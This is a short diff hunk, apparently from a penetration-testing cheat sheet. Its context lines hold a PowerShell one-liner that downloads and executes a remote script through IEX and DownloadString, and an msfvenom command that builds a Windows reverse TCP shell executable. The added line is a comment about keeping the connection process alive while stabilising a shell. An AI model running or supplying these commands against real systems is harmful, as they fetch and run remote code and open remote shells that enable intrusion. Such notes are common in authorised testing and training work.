@@ -10,3 +10,4 @@ powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://<
 
 msfvenom -p windows/x64/shell/reverse_tcp LHOST=$(hostname -I | cut -d " " -f2) LPORT=<LOCALPORT> -f exe -o payload.exe
 
+::Whoever, this type of stabilisation will require that the main process of the active connection maintain active and not to be canceled.
